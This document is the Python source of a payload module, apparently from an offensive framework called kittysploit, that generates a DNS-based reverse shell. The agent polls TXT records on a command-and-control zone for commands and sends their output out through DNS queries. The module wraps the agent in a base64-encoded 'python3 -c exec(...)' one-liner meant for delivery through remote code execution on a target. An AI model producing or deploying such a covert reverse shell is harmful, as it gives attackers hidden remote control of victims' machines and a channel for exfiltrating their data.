from kittysploit import *
import base64

from lib.c2.dns_reverse_agent import build_python_dns_agent_script


class Module(Payload):
	"""DNS TXT polling agent — deliverable via RCE; pairs with listeners/covert/dns."""

	CLIENT_LANGUAGE = "python"

	__info__ = {
		"name": "Python DNS Reverse Shell",
		"description": (
			"Poll DNS TXT records for commands and exfil output via result queries "
			"(stdlib UDP DNS — no dnspython required on target). "
			"Pairs with listeners/covert/dns."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.PYTHON,
		"platform": Platform.MULTI,
		"listener": "listeners/covert/dns",
		"handler": Handler.REVERSE,
		"session_type": SessionType.DNS,
	}

	domain = OptString("c2.local", "C2 DNS zone (must match listener)", True)
	client_id = OptString("", "Agent client ID", False)
	lhost = OptString("127.0.0.1", "DNS server address (C2 host)", True)
	lport = OptPort(53, "DNS server port (53 or listener lport)", True)
	poll_interval = OptInteger(5, "Poll interval seconds", False)
	python_binary = OptString("python3", "Python on target", True)

	def generate(self):
		identity = None
		if hasattr(self, "_apply_implant_identity_options"):
			try:
				identity = self._apply_implant_identity_options()
			except Exception:
				identity = None
		cid = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
		if identity and getattr(identity, "implant_id", None):
			cid = identity.implant_id
		elif not cid:
			cid = "dns1"

		script = build_python_dns_agent_script(
			str(self.domain or "c2.local"),
			cid,
			str(self.lhost),
			int(self.lport),
			float(getattr(getattr(self, "poll_interval", None), "value", self.poll_interval) or 5),
		)
		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
		py = str(self.python_binary)
		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
